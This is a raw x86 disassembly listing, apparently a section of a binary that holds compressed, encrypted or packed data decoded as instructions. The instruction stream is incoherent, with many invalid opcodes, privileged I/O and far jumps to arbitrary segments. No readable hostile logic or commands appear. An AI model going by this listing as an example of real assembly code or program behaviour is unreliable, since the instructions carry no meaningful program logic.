  408ef3:	inc    DWORD PTR [ecx+0x39799e8]
  408ef9:	lods   eax,DWORD PTR ds:[esi]
  408efa:	scas   al,BYTE PTR es:[edi]
  408efb:	sbb    ch,dl
  408efd:	adc    BYTE PTR [ebx+0x24],bh
  408f00:	adc    eax,0xc9aa0fb7
  408f05:	stos   DWORD PTR es:[edi],eax
  408f06:	ja     0x408ee7
  408f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f09:	in     al,dx
  408f0a:	hlt    
  408f0b:	aaa    
  408f0c:	fdivr  DWORD PTR [ebx-0x2c]
  408f0f:	jmp    0xf8c962b8
  408f14:	stc    
  408f15:	xor    al,0x76
  408f17:	gs shl ch,1
  408f1a:	pop    edx
  408f1b:	call   0xfed3:0xa9c55ff2
  408f22:	js     0x408f30
  408f24:	sub    BYTE PTR [ecx-0x3eaa5021],al
  408f2a:	ficom  WORD PTR [eax]
  408f2c:	push   ecx
  408f2d:	or     dh,BYTE PTR ss:[edi-0x7d]
  408f31:	mov    ah,ch
  408f33:	cwde   
  408f34:	rcl    BYTE PTR [ebp+0x406e9eec],cl
  408f3a:	lahf   
  408f3b:	fidiv  DWORD PTR [ecx]
  408f3d:	lods   al,BYTE PTR ds:[esi]
  408f3e:	adc    ecx,DWORD PTR [ecx]
  408f40:	neg    esi
  408f42:	adc    DWORD PTR [ecx+0xc],eax
  408f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f46:	in     eax,0x25
  408f48:	push   esp
  408f49:	pop    ss
  408f4a:	inc    esp
  408f4b:	inc    eax
  408f4c:	test   al,0xdf
  408f4e:	sub    eax,0x96ac30d2
  408f53:	scas   eax,DWORD PTR es:[edi]
  408f54:	stos   DWORD PTR es:[edi],eax
  408f55:	(bad)  
  408f56:	aaa    
  408f57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f58:	mov    ds:0xb2d7a786,al
  408f5d:	shr    BYTE PTR [eax+ebp*4],0x20
  408f61:	add    BYTE PTR fs:[edi],dl
  408f64:	mov    eax,0x764ecd84
  408f69:	bound  ecx,QWORD PTR [esi-0x3a]
  408f6c:	mov    ebp,0xdc9d4c7e
  408f71:	and    eax,0x9e9ae7db
  408f76:	cli    
  408f77:	dec    eax
  408f78:	lods   al,BYTE PTR ds:[esi]
  408f79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f7a:	daa    
  408f7b:	hlt    
  408f7c:	or     DWORD PTR [ecx],esp
  408f7e:	outs   dx,BYTE PTR ds:[esi]
  408f7f:	mov    ecx,0x3cd8663a
  408f84:	fwait
  408f85:	and    ebx,ecx
  408f87:	pop    ds
  408f88:	sbb    cl,BYTE PTR [edx]
  408f8a:	pop    esi
  408f8b:	add    edi,DWORD PTR [edi-0x4d]
  408f8e:	add    DWORD PTR ds:0xbf2e0006,esp
  408f94:	dec    esp
  408f95:	xor    al,0x85
  408f97:	cdq    
  408f98:	stos   BYTE PTR es:[edi],al
  408f99:	dec    ebp
  408f9a:	dec    eax
  408f9b:	and    dl,BYTE PTR [esi]
  408f9d:	push   0xffffffa1
  408f9f:	push   ecx
  408fa0:	push   esi
  408fa1:	out    0x7d,eax
  408fa3:	fidivr DWORD PTR [edi]
  408fa5:	push   ds
  408fa6:	(bad)  
  408fa7:	idiv   BYTE PTR [edi]
  408fa9:	hlt    
  408faa:	test   al,0xe9
  408fac:	icebp  
  408fad:	arpl   WORD PTR [ebp-0x30],ax
  408fb0:	mov    cl,0xd
  408fb2:	adc    al,0x36
  408fb4:	test   eax,0xeb3eb06a
  408fb9:	int3   
  408fba:	int    0x2b
  408fbc:	inc    esp
  408fbd:	ret    0x413e
  408fc0:	popf   
  408fc1:	adc    ebp,DWORD PTR [ebp-0x15a73efa]
  408fc7:	sub    BYTE PTR [edx-0x35],0x14
  408fcb:	mov    cl,BYTE PTR [esi+eiz*4+0x31c4e4a5]
  408fd2:	fild   WORD PTR [esi+0x5962b0b4]
  408fd8:	jecxz  0x409033
  408fda:	mov    eax,es
  408fdc:	adc    esp,eax
  408fde:	retf   
  408fdf:	dec    esi
  408fe0:	xchg   ebx,eax
  408fe1:	mov    bl,0x1c
  408fe3:	cwde   
  408fe4:	mov    ch,0x86
  408fe6:	in     al,0x60
  408fe8:	mov    edi,0xb8d218c5
  408fed:	sub    BYTE PTR [edi+0x133f4479],dh
  408ff3:	pop    edi
  408ff4:	dec    ecx
  408ff5:	repz cli 
  408ff7:	mov    ds:0x3d0efd17,eax
  408ffc:	add    al,0xbe
  408ffe:	in     eax,dx
  408fff:	inc    ebp
  409000:	int    0x40
  409002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409003:	and    edi,esp
  409005:	les    edi,FWORD PTR [ecx]
  409007:	inc    ebp
  409008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409009:	sbb    ebx,DWORD PTR [ecx-0x6ae05b0e]
  40900f:	xchg   edi,eax
  409010:	push   0x31710dfb
  409015:	dec    esi
  409016:	push   esp
  409017:	sub    eax,0x7431e9
  40901c:	mov    esp,0xe37ba39c
  409021:	lock dec eax
  409023:	or     BYTE PTR [ebx],cl
  409025:	xchg   edx,eax
  409026:	ret    0x41e2
  409029:	cdq    
  40902a:	mov    ebp,0x9fedc0bf
  40902f:	sub    ecx,ecx
  409031:	lods   eax,DWORD PTR ds:[esi]
  409032:	sub    BYTE PTR [eax-0x2b],0x26
  409036:	ret    
  409037:	adc    esp,eax
  409039:	xchg   ecx,eax
  40903a:	or     al,0xf8
  40903c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40903d:	pop    ebp
  40903e:	cld    
  40903f:	push   edx
  409040:	adc    esi,DWORD PTR [eax+0x6cca8a0b]
  409046:	add    BYTE PTR [edi],bh
  409048:	mov    dl,0xdf
  40904a:	cld    
  40904b:	out    0xa4,eax
  40904d:	stc    
  40904e:	in     eax,dx
  40904f:	cli    
  409050:	outs   dx,BYTE PTR ds:[esi]
  409051:	jne    0x40901b
  409053:	call   DWORD PTR [ebp-0x4b]
  409056:	cdq    
  409057:	mov    ecx,0x3348325e
  40905c:	push   cs
  40905d:	sub    al,0xa3
  40905f:	push   ecx
  409060:	popf   
  409061:	push   ss
  409062:	xor    DWORD PTR [ecx+esi*1+0x518549f7],esp
  409069:	mov    esp,0x6882a125
  40906e:	and    DWORD PTR [esi+ecx*4-0x5d048ef8],0x18
  409076:	lock xor esi,ebp
  409079:	test   edx,eax
  40907b:	dec    eax
  40907c:	cdq    
  40907d:	call   0xb90a:0xb3cf1283
  409084:	call   0x4226:0x5d500272
  40908b:	sub    dl,BYTE PTR ds:[esi+0x70]
  40908f:	mov    bl,0xf0
  409091:	jns    0x4090b9
  409093:	jns    0x4090ef
  409095:	dec    cx
  409097:	fsubr  st(4),st
  409099:	push   ebp
  40909a:	mov    ebx,0x37354cc4
  40909f:	pop    eax
  4090a0:	inc    ecx
  4090a1:	sub    DWORD PTR [eax-0x37],ecx
  4090a4:	cld    
  4090a5:	jle    0x4090e6
  4090a7:	retf   0x3ac0
  4090aa:	xchg   esi,eax
  4090ab:	ins    DWORD PTR es:[edi],dx
  4090ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090ad:	not    BYTE PTR [edi+0x6f4fbba]
  4090b3:	scas   eax,DWORD PTR es:[edi]
  4090b4:	sbb    DWORD PTR [ecx],eax
  4090b6:	jo     0x409038
  4090b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090b9:	jge    0x40909c
  4090bb:	into   
  4090bc:	mov    eax,ds:0x87e84787
  4090c1:	inc    esp
  4090c2:	sbb    DWORD PTR cs:[ebp-0x55459b5],esi
  4090c9:	mov    esp,0x5bf0dcd7
  4090ce:	test   eax,0xc3cd9ef3
  4090d3:	jmp    0x7b03:0xc7aab448
  4090da:	inc    edi
  4090db:	mov    bl,al
  4090dd:	mov    dl,0xea
  4090df:	add    BYTE PTR [eax+0x50091a8d],al
  4090e5:	sbb    al,0x78
  4090e7:	lahf   
  4090e8:	and    ah,dl
  4090ea:	cmp    esi,DWORD PTR [esp+eax*2+0x15]
  4090ee:	xchg   bl,bl
  4090f0:	xchg   esp,esp
  4090f2:	icebp  
  4090f3:	(bad)  
  4090f4:	jg     0x409077
  4090f6:	jae    0x409122
  4090f8:	sub    al,0x9b
  4090fa:	inc    eax
  4090fb:	and    eax,0xcd2be766
  409100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409101:	pop    ebp
  409102:	jmp    0xfee589ba
  409107:	les    ebp,FWORD PTR [eax-0x6460cdb1]
  40910d:	in     eax,dx
  40910e:	ja     0x409100
  409110:	adc    BYTE PTR [esi-0x78a1d247],0x9c
  409117:	push   edi
  409118:	cwde   
  409119:	sub    BYTE PTR [esi+edi*1],dh
  40911c:	push   ds
  40911d:	loopne 0x40914a
  40911f:	leave  
  409120:	in     eax,dx
  409121:	xlat   BYTE PTR ds:[ebx]
  409122:	(bad)  
  409123:	sub    ebx,DWORD PTR [ebp+ebx*1+0x65]
  409127:	xchg   ebx,eax
  409128:	sbb    bh,bh
  40912a:	mov    eax,ds:0x8c43a49d
  40912f:	nop
  409130:	arpl   WORD PTR [edi-0x29],bp
  409133:	les    edi,FWORD PTR [ebx+0x653f43b0]
  409139:	outs   dx,BYTE PTR ds:[esi]
  40913a:	addr16 adc al,0x31
  40913d:	cmp    cl,BYTE PTR [ebp-0x53fa38c9]
  409143:	pop    esp
  409144:	pop    ebp
  409145:	pop    ebx
  409146:	ins    DWORD PTR es:[edi],dx
  409147:	add    BYTE PTR ds:0x424b646f,cl
  40914d:	sub    eax,0x14af67db
  409152:	or     al,0xda
  409154:	sbb    DWORD PTR [eax-0x67972706],ebx
  40915a:	ja     0x4090f7
  40915c:	jl     0x409196
  40915e:	and    eax,0xcf5acd17
  409163:	sub    al,0xce
  409165:	xchg   esp,eax
  409166:	push   edx
  409167:	xlat   BYTE PTR ds:[ebx]
  409168:	pusha  
  409169:	pop    edx
  40916a:	mov    ds:0x9753fb7e,eax
  40916f:	es out dx,al
  409171:	mov    ch,0x35
  409173:	push   ds
  409174:	adc    BYTE PTR [edi-0x5d],0xa4
  409178:	stos   BYTE PTR es:[edi],al
  409179:	outs   dx,BYTE PTR ds:[esi]
  40917a:	add    al,0x2e
  40917c:	or     esi,ecx
  40917e:	dec    ebp
  40917f:	mov    ebp,cs
  409181:	popa   
  409182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409183:	sbb    al,0x59
  409185:	cwde   
  409186:	cmp    BYTE PTR [edi],al
  409188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409189:	xchg   DWORD PTR [ecx],ebp
  40918b:	xchg   ebp,eax
  40918c:	mov    ecx,0xd1935e6e
  409191:	cmp    DWORD PTR [ebp+0x4f2794d7],edx
  409197:	xchg   ebx,eax
  409198:	mov    esp,0x389d6f8
  40919d:	lods   eax,DWORD PTR ds:[esi]
  40919e:	jle    0x4091d6
  4091a0:	loope  0x4091b9
  4091a2:	lods   al,BYTE PTR ds:[esi]
  4091a3:	ins    DWORD PTR es:[edi],dx
  4091a4:	pop    esi
  4091a5:	jge    0x4091d5
  4091a7:	bound  ecx,QWORD PTR [esi+0xb]
  4091aa:	xor    ebp,DWORD PTR [edx]
  4091ac:	xchg   edx,eax
  4091ad:	(bad)
  4091b0:	dec    esi
  4091b1:	in     al,dx
  4091b2:	push   es
  4091b3:	loope  0x409192
  4091b5:	xchg   ah,ah
  4091b7:	add    DWORD PTR ds:0x7bb4096a,0xa322bc08
  4091c1:	(bad)  
  4091c3:	cmp    cl,BYTE PTR [edi]
  4091c5:	fsub   st,st(2)
  4091c7:	aam    0xa
  4091c9:	jg     0x40914b
  4091cb:	sar    edx,cl
  4091cd:	add    ah,al
  4091cf:	pop    ds
  4091d0:	inc    ecx
  4091d1:	push   esi
  4091d2:	iret   
  4091d3:	out    dx,eax
  4091d4:	mov    WORD PTR [ecx+0x26],?
  4091d7:	daa    
  4091d8:	repz add ecx,DWORD PTR [ebx+0x4867494c]
  4091df:	stos   DWORD PTR es:[edi],eax
  4091e0:	cdq    
  4091e1:	shr    ebx,cl
  4091e3:	in     al,0x35
  4091e5:	adc    ebp,0x3d
  4091e8:	call   0x3d368b3e
  4091ed:	rcr    ch,cl
  4091ef:	test   BYTE PTR [ebp-0x67],0xd6
  4091f3:	mov    ah,0xfc
  4091f5:	imul   ah
  4091f7:	ss leave 
  4091f9:	mov    esi,0xd03a1578
  4091fe:	andnps xmm1,XMMWORD PTR [ebp+0x74]
  409202:	sub    cl,BYTE PTR [eax]
  409204:	jl     0x4091db
  409206:	cmp    DWORD PTR [eax-0x71220503],0x78
  40920d:	mov    bl,0x69
  40920f:	es pushf 
  409211:	jp     0x409209
  409213:	das    
  409214:	add    al,0x32
  409216:	repnz adc ebx,DWORD PTR [edx+0x18c94f0e]
  40921d:	(bad)  
  40921e:	mov    ds:0x9a339b40,al
  409223:	rcr    BYTE PTR [ebp-0x17],cl
  409226:	jp     0x4091bb
  409228:	jl     0x4091d2
  40922a:	mov    bl,0xd0
  40922c:	mov    ds:0xa5450394,eax
  409231:	inc    ebp
  409232:	sbb    DWORD PTR [edx+edi*8+0x5b],esp
  409236:	jb     0x4091bb
  409238:	je     0x409255
  40923a:	(bad)  
  40923b:	out    0x43,eax
  40923d:	mov    WORD PTR [eax+0x4c],gs
  409240:	cmp    cl,BYTE PTR [esi-0x1f6ac0be]
  409246:	lods   eax,DWORD PTR ds:[esi]
  409247:	ja     0x409228
  409249:	pop    ds
  40924a:	push   ebx
  40924b:	and    BYTE PTR [edi-0x48],bh
  40924e:	pop    esp
  40924f:	imul   ebp,DWORD PTR [esp+edi*4],0xd11a46a0
  409256:	mov    ebx,0x470ac024
  40925b:	sbb    DWORD PTR [eax-0x307a6d42],edx
  409261:	std    
  409262:	push   0x1d
  409264:	push   esi
  409265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409266:	jge    0x409287
  409268:	jb     0x4092d3
  40926a:	fstp   TBYTE PTR [eax+0x704ee62f]
  409270:	mov    BYTE PTR [ebx],al
  409272:	push   es
  409273:	jl     0x4092be
  409275:	sbb    ch,al
  409277:	jne    0x409221
  409279:	add    DWORD PTR [eax],eax
  40927b:	jmp    0x409786
  409280:	retf   0x3e3d
  409283:	into   
  409284:	leave  
  409285:	int    0xda
  409287:	fldenv [esi-0x4f5dd707]
  40928d:	sar    bl,1
  40928f:	inc    esp
  409290:	cmp    dh,ch
  409292:	js     0x40930c
  409294:	push   0x7c
  409296:	js     0x409310
  409298:	and    eax,0x6eddb806
  40929d:	sbb    al,0x3e
  40929f:	sbb    al,bl
  4092a1:	retf   0xcaf5
  4092a4:	cwde   
  4092a5:	mov    eax,0x72796ffa
  4092aa:	and    eax,0x86865f47
  4092af:	int    0x9e
  4092b1:	hlt    
  4092b2:	push   ebx
  4092b3:	xchg   edx,eax
  4092b4:	(bad)  
  4092b5:	iret   
  4092b6:	lods   eax,DWORD PTR ds:[esi]
  4092b7:	cmp    ebx,DWORD PTR [edi]
  4092b9:	leave  
  4092ba:	in     al,dx
  4092bb:	mov    BYTE PTR [ecx-0x5a],bh
  4092be:	or     eax,0xa4e28a72
  4092c3:	sar    BYTE PTR [ebx-0x6b],1
  4092c6:	add    ah,ah
  4092c8:	cmp    DWORD PTR ds:0xc81d714a,esp
  4092ce:	pop    ecx
  4092cf:	mov    eax,DWORD PTR [edx-0x45]
  4092d2:	daa    
  4092d3:	add    ch,ch
  4092d5:	mov    esp,esp
  4092d7:	test   BYTE PTR [ecx+0x4bf5a426],dl
  4092dd:	mov    BYTE PTR [edx],al
  4092df:	cmp    eax,0xd337b482
  4092e4:	(bad)  
  4092e5:	pop    eax
  4092e6:	mul    ecx
  4092e8:	and    DWORD PTR [ebx+edi*8-0x62],edx
  4092ec:	sbb    DWORD PTR [ebx+0x27],0xd9680067
  4092f3:	ret    
  4092f4:	(bad)  
  4092f5:	int    0x43
  4092f7:	mov    dh,ah
  4092f9:	aas    
  4092fa:	push   ebp
  4092fb:	pop    ss
  4092fc:	(bad)  
  4092fd:	inc    edx
  4092ff:	test   BYTE PTR [eax+0x28e7810d],0xe
  409306:	in     al,dx
  409307:	fisubr WORD PTR [eax]
  409309:	or     DWORD PTR [ecx+ebp*1+0x129061a0],0xfffffffe
  409311:	jmp    0x1ccf:0x8dd0efe6
  409318:	push   esp
  409319:	mov    edi,0x1705f135
  40931e:	iret   
  40931f:	retf   
  409320:	push   ss
  409321:	imul   esi,DWORD PTR [ebx+edx*4-0x16],0x7a
  409326:	(bad)  
  409327:	lock jmp 0x410a:0x9ad223b5
  40932f:	sbb    DWORD PTR [ecx+0x79],ecx
  409332:	cmp    DWORD PTR [ecx],ebx
  409334:	sbb    dl,0x1f
  409337:	jb     0x409311
  409339:	add    BYTE PTR ds:0x4483d7e9,dl
  40933f:	push   eax
  409340:	ss adc ah,cl
  409343:	xchg   ecx,eax
  409344:	inc    ebx
  409345:	inc    edx
  409346:	rcl    edi,1
  409348:	sub    edi,edx
  40934a:	call   0x19ef:0x68ad6673
  409351:	jne    0x409390
  409353:	mov    al,ds:0x5e5936e8
  409358:	mov    cl,BYTE PTR [edx-0x6e]
  40935b:	xchg   esi,eax
  40935c:	(bad)  
  40935d:	(bad)  
  40935e:	sbb    eax,DWORD PTR [edx+0x606cdb79]
  409364:	rcpps  xmm2,XMMWORD PTR [edi]
  409367:	cwde   
  409368:	aad    0x93
  40936a:	dec    edx
  40936b:	mov    dl,cl
  40936d:	out    0xa5,al
  40936f:	mov    bl,0x9f
  409371:	repz retf 0xbd76
  409375:	and    BYTE PTR [ebx],dh
  409377:	and    esp,DWORD PTR [ecx]
  409379:	inc    edx
  40937a:	xor    dh,dl
  40937c:	rcl    BYTE PTR [eax-0x4ac7e284],0xfd
  409383:	dec    edx
  409384:	push   0x315a31ba
  409389:	iret   
  40938a:	mov    ecx,0xa3cad85e
  40938f:	push   ebx
  409390:	dec    esp
  409391:	jo     0x40931b
  409393:	nop
  409394:	mov    cl,0x33
  409396:	pop    esp
  409397:	das    
  409398:	sbb    cl,BYTE PTR [ecx]
  40939a:	push   ebp
  40939b:	pop    ebx
  40939c:	data16 mov cl,BYTE PTR ds:0x8d2d595c
  4093a3:	pop    ebx
  4093a4:	lock pop ebx
  4093a6:	pop    ebp
  4093a7:	in     al,0x10
  4093a9:	dec    eax
  4093aa:	and    ch,BYTE PTR [edi-0x50cb18c5]
  4093b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093b1:	jns    0x409424
  4093b3:	dec    edx
  4093b4:	je     0x40940c
  4093b6:	sbb    eax,0xffffffb6
  4093b9:	cdq    
  4093ba:	call   DWORD PTR [ecx]
  4093bc:	(bad)  
  4093bd:	jmp    0x4093b9
  4093bf:	fld    DWORD PTR [ebp+0x21]
  4093c2:	inc    edx
  4093c3:	into   
  4093c4:	adc    cl,ch
  4093c6:	mov    ds:0x96bb1f0b,al
  4093cb:	mov    edx,0x25919ede
  4093d0:	and    al,0x3b
  4093d2:	cmp    edx,esi
  4093d4:	ret    0xc6d1
  4093d7:	gs js  0x40943a
  4093da:	loopne 0x4093e9
  4093dc:	popf   
  4093dd:	and    DWORD PTR [esi+0x50],edi
  4093e0:	test   eax,0xe671df7a
  4093e5:	jno    0x409425
  4093e7:	in     al,dx
  4093e8:	cli    
  4093e9:	ins    DWORD PTR es:[edi],dx
  4093ea:	jb     0x40943d
  4093ec:	adc    ebx,DWORD PTR [edx+0x7e]
  4093ef:	adc    al,0x3
  4093f1:	gs (bad) 
  4093f3:	jne    0x40939c
  4093f5:	xchg   esi,eax
  4093f6:	xchg   edx,eax
  4093f7:	(bad)  
  4093f8:	xchg   BYTE PTR [edx],bl
  4093fa:	icebp  
  4093fb:	bnd jg 0x409463
  4093fe:	mov    ebp,0x3181937d
  409403:	xchg   esp,eax
  409404:	in     eax,0xfb
  409406:	xor    DWORD PTR [edx+0x13],0x26f0a5d1
  40940d:	push   ss
  40940e:	sub    BYTE PTR [ebx+0x66ed8da7],cl
  409414:	mov    DWORD PTR [edx],ecx
  409416:	lds    ebp,FWORD PTR [eax+esi*8+0x7dcfaba0]
  40941d:	lock xchg ecx,eax
  40941f:	xor    eax,0xd3abc824
  409424:	xchg   ebx,eax
  409425:	bound  edx,QWORD PTR [eax]
  409427:	repz ret 0x3c40
  40942b:	or     ebp,DWORD PTR ds:0x2833083
  409431:	ins    DWORD PTR es:[edi],dx
  409432:	out    0xe8,al
  409434:	mov    ah,0x5b
  409436:	or     ecx,DWORD PTR [ebp+0x62]
  409439:	xor    ecx,ecx
  40943b:	push   ebx
  40943c:	out    dx,al
  40943d:	xchg   esi,eax
  40943e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40943f:	push   cs
  409440:	imul   edi,DWORD PTR [edx+ebx*1+0x28],0x1e
  409445:	gs jecxz 0x409464
  409448:	push   esp
  409449:	adc    edx,edi
  40944b:	sahf   
  40944c:	sar    BYTE PTR [esi],1
  40944e:	ret    0xfc6a
  409451:	push   cs
  409452:	inc    eax
  409453:	sub    DWORD PTR [eax-0x3d2c51a6],edx
  409459:	sar    DWORD PTR [esi],0x8c
  40945c:	xor    eax,0x9d37b5ba
  409461:	data16 jb 0x409437
  409464:	push   0x7ac0cd7b
  409469:	add    eax,0xf5bdb080
  40946e:	and    dl,dl
  409470:	cli    
  409471:	push   edx
  409472:	into   
  409473:	sahf   
  409474:	dec    ebp
  409475:	mov    bl,0xb3
  409477:	pop    ebp
  409478:	sti    
  409479:	loop   0x40943a
  40947b:	jno    0x40942d
  40947d:	jle    0x40945d
  40947f:	xor    BYTE PTR [ecx+eax*2-0x714c59f1],dl
  409486:	call   ebx
  409488:	inc    ebx
  409489:	repnz push esp
  40948b:	jmp    FWORD PTR [ecx]
  40948d:	leavew 
  40948f:	inc    ebx
  409490:	sti    
  409491:	outs   dx,BYTE PTR ds:[esi]
  409492:	push   eax
  409493:	pop    ds
  409494:	pop    ss
  409495:	mov    ds:0xcea2da37,eax
  40949a:	lods   eax,DWORD PTR ds:[esi]
  40949b:	mov    WORD PTR [ebp+0x2ab3386c],cs
  4094a1:	popa   
  4094a2:	and    bl,dh
  4094a4:	pop    esp
  4094a6:	dec    edi
  4094a7:	popf   
  4094a8:	loope  0x409440
  4094aa:	(bad)  
  4094ab:	mov    ds:0x1999355d,al
  4094b0:	lods   eax,DWORD PTR ds:[esi]
  4094b1:	xchg   edx,eax
  4094b2:	pushf  
  4094b3:	aas    
  4094b4:	ret    0x2724
  4094b7:	dec    eax
  4094b8:	fucomp st(3)
  4094ba:	adc    eax,0x305c59bc
  4094bf:	das    
  4094c0:	mov    al,ds:0xec36ded2
  4094c5:	fild   WORD PTR [ebx-0x63]
  4094c8:	push   cs
  4094c9:	jns    0x4094f0
  4094cb:	cmp    ch,al
  4094cd:	mov    esp,0x64cbc862
  4094d2:	shl    DWORD PTR [eax],0xc
  4094d5:	ret    0x9fbd
  4094d8:	mov    ebx,DWORD PTR [ebx]
  4094da:	(bad)  
  4094db:	aad    0x2
  4094dd:	inc    edx
  4094de:	aad    0xe0
  4094e0:	push   eax
  4094e1:	mov    ebx,0x66686e3d
  4094e6:	dec    ebp
  4094e7:	inc    ebx
  4094e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094e9:	mov    bl,0xe4
  4094eb:	mov    WORD PTR [ecx],?
  4094ed:	ss aam 0x90
  4094f0:	sub    eax,DWORD PTR [edi-0x97c1266]
  4094f6:	inc    ebp
  4094f7:	and    al,0x27
  4094f9:	xchg   esi,eax
  4094fa:	xor    al,0xd3
  4094fc:	or     ebp,DWORD PTR [ebp+0x0]
  4094ff:	div    BYTE PTR [edx+ecx*2]
  409502:	in     eax,0x2a
  409504:	test   eax,0xa1283700
  409509:	fdivr  QWORD PTR [eax]
  40950b:	push   0xb
  40950d:	ins    DWORD PTR es:[edi],dx
  40950e:	pop    ebx
  40950f:	fsubrp st(6),st
  409511:	mov    ecx,eax
  409513:	or     eax,0x20898b06
  409518:	fst    DWORD PTR [edx+0x27]
  40951b:	scas   eax,DWORD PTR es:[edi]
  40951c:	in     eax,dx
  40951d:	fs jecxz 0x4094ee
  409520:	out    dx,eax
  409521:	inc    eax
  409522:	out    dx,al
  409523:	cmp    eax,0x962f25f
  409528:	adc    BYTE PTR [ebx*4-0x242c226d],cl
  40952f:	xchg   BYTE PTR [ecx+0x74a10060],bl
  409535:	repz and WORD PTR [eax+0x67],bx
  40953a:	stos   BYTE PTR es:[edi],al
  40953b:	push   ds
  40953c:	mov    bl,0xdf
  40953e:	std    
  40953f:	xor    DWORD PTR [eax+0x20b4dce8],eax
  409545:	sbb    BYTE PTR [ecx],bl
  409547:	xor    DWORD PTR [edi],0xffffff84
  40954a:	sub    DWORD PTR [ebp+0x7f],ebx
  40954d:	sub    esp,DWORD PTR [esi+0x6d]
  409550:	add    dl,BYTE PTR [esi+esi*8+0x1e]
  409554:	retf   0xf62
  409557:	adc    esi,ebp
  409559:	retf   
  40955a:	stos   DWORD PTR es:[edi],eax
  40955b:	xchg   esi,eax
  40955c:	push   edi
  40955d:	pop    esp
  40955e:	mov    WORD PTR [ebx-0x7],cs
  409561:	ficomp DWORD PTR [ecx-0xd]
  409564:	mov    edx,0x2b26501a
  409569:	and    al,BYTE PTR [ebp-0x15]
  40956c:	pop    eax
  40956d:	lea    edi,[ecx+0x465f2939]
  409573:	imul   edx,DWORD PTR ds:0xbb7762d0,0x73
  40957a:	int3   
  40957b:	call   0x5cc7fad8
  409580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409581:	ins    DWORD PTR es:[edi],dx
  409582:	das    
  409583:	ss push eax
  409585:	jmp    0x40955e
  409587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409588:	add    al,0x35
  40958a:	xchg   sp,ax
  40958c:	dec    ebx
  40958d:	sub    BYTE PTR ds:0xcb3b8801,al
  409593:	test   BYTE PTR [eax-0x47],al
  409596:	mov    ch,0xe6
  409598:	imul   ebx,DWORD PTR [esi],0xe88b32e
  40959e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40959f:	mov    eax,0xeeccdaf7
  4095a4:	aad    0x2a
  4095a6:	(bad)  
  4095a7:	pop    edi
  4095a8:	outs   dx,DWORD PTR ds:[esi]
  4095a9:	inc    esi
  4095aa:	in     eax,0xff
  4095ac:	xor    DWORD PTR [esi+0x28b9717d],0x191b9942
  4095b6:	jle    0x409607
  4095b8:	dec    edx
  4095b9:	ds cld 
  4095bb:	or     al,dh
  4095bd:	fisttp WORD PTR [ebx+0x7b39af9e]
  4095c3:	cli    
  4095c4:	push   ecx
  4095c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095c6:	(bad)  
  4095c8:	dec    eax
  4095c9:	cmc    
  4095ca:	dec    ebx
  4095cb:	dec    eax
  4095cc:	lahf   
  4095cd:	test   BYTE PTR [eax+edi*4+0x4cea3d56],cl
  4095d4:	daa    
  4095d5:	imul   esp,DWORD PTR ds:0x74c855d8,0x18e024b4
  4095df:	jmp    0x9458:0x5db05ea4
  4095e6:	and    eax,0xf12037da
  4095eb:	std    
  4095ec:	cli    
  4095ed:	or     eax,DWORD PTR [ebx]
  4095ef:	lea    ebx,[eax-0x6e]
  4095f2:	mov    al,0x61
  4095f4:	(bad)  
  4095f5:	mov    ch,0x42
  4095f7:	lea    eax,[edx+0x18fb5883]
  4095fd:	imul   esp,DWORD PTR [eax+0x7d],0x1e
  409601:	mov    al,ds:0x67966b3a
  409606:	loop   0x4095e4
  409608:	rcl    al,cl
  40960a:	dec    ebx
  40960b:	leave  
  40960c:	xchg   DWORD PTR [edx+0x35],ebp
  40960f:	out    dx,al
  409610:	or     ecx,DWORD PTR [ebx-0x1]
  409613:	in     eax,0xac
  409615:	(bad)  
  409616:	rol    BYTE PTR [edi+0x2c],cl
  409619:	test   al,0x8d
  40961b:	je     0x409693
  40961d:	or     eax,0x106703e8
  409622:	fsubr  DWORD PTR [edx-0x13]
  409625:	jne    0x4095c1
  409627:	fcmovu st,st(7)
  409629:	sbb    eax,0x90d78867
  40962e:	or     DWORD PTR [esi+0x0],esp
  409631:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409632:	cdq    
  409633:	inc    edi
  409634:	and    dl,bl
  409636:	imul   DWORD PTR [ecx+0x6898beec]
  40963c:	dec    eax
  40963d:	pop    edi
  40963e:	dec    ebx
  40963f:	push   ss
  409640:	mov    BYTE PTR [edx-0x52],cl
  409643:	or     eax,0xd723b5ea
  409648:	inc    ebp
  409649:	retf   0x195
  40964c:	pop    es
  40964d:	aas    
  40964e:	(bad)  
  40964f:	jb     0x40965c
  409651:	dec    edi
  409652:	outs   dx,BYTE PTR ds:[esi]
  409653:	sbb    esp,DWORD PTR [ebx+0x63004849]
  409659:	mov    DWORD PTR [edi+eax*1],esi
  40965c:	aam    0x9c
  40965e:	sub    BYTE PTR [ebp-0xf],al
  409661:	loopne 0x409648
  409663:	int3   
  409664:	cs retf 0x98e3
  409668:	dec    ebx
  409669:	xor    DWORD PTR [ebp+eiz*2+0x42],eax
  40966d:	inc    edi
  40966e:	nop
  40966f:	ss jmp 0x71d6:0xe4d9edde
  409677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409678:	call   0x93c0:0x843d1390
  40967f:	pop    ebp
  409680:	test   al,0x37
  409682:	inc    ecx
  409683:	dec    esi
  409684:	adc    DWORD PTR [esi+eiz*4-0x2d],edx
  409688:	ror    BYTE PTR [edi-0x26],cl
  40968b:	(bad)  
  40968c:	(bad)  
